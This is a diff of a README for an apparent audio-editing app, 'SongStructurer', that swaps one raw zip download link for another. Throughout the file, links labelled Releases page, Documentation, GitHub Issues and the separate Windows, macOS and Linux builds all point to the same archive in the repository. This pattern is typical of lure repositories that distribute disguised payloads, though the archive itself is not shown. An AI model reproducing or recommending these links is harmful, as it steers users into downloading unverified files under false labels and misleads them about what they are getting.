@@ -6,7 +6,7 @@ Welcome to SongStructurer! This app helps you edit audio files by breaking them 
 
 ## 📥 Download
 
-[![Download SongStructurer](https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip)](https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip)
+[![Download SongStructurer](https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip)](https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip)
 
 Click the button above to download the latest version of SongStructurer. 
 
@@ -14,7 +14,7 @@ Click the button above to download the latest version of SongStructurer.
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip) to see all available versions of SongStructurer. 
+   Go to the [Releases page](https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip) to see all available versions of SongStructurer. 
 
 2. **Choose the Right Version**
 
@@ -24,9 +24,9 @@ Click the button above to download the latest version of SongStructurer.
 
    You will find several files listed. Look for the file that matches your operating system:
 
-   - For **Windows**: Download the `https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip` file.
-   - For **macOS**: Look for the `https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip` file.
-   - For **Linux**: Download the `https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip` file.
+   - For **Windows**: Download the `https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip` file.
+   - For **macOS**: Look for the `https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip` file.
+   - For **Linux**: Download the `https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip` file.
 
    Click on the appropriate file to begin downloading.
 
@@ -89,8 +89,8 @@ SongStructurer is an open-source project. Your contributions are welcome!
 
 ## 🔗 Links
 
-- [SongStructurer Releases](https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip)
-- [Documentation](https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Omweno9850/SongStructurer/main/agrufe/SongStructurer.zip)
+- [SongStructurer Releases](https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip)
+- [Documentation](https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip)
+- [GitHub Issues](https://github.com/Omweno9850/SongStructurer/raw/refs/heads/main/assets/Structurer-Song-v1.8.zip)
 
 Enjoy editing your music with SongStructurer!
